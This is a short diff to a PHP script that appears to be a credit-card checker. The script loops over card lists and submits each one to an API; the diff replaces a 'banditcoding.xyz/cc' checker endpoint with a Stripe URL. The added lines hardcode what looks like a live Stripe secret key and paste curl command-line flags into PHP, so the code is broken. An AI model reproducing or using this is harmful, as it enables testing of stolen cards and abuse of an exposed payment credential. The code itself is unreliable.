@@ -54,8 +54,10 @@ echo "\n[+] TOTAL $total lists [+]\n\n";
 foreach ($lists as $list) {
      $no++;
      //API
-     $url = "https://api.banditcoding.xyz/cc/v1/?cc=$list";
-     
+     $url = "https://api.stripe.com/v1/products=$list";
+  -u "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:"
+  -d "fixed_amount[amount]"=30
+  -d "fixed_amount[currency]"=usd
      //CURL
      
      $ch = curl_init();
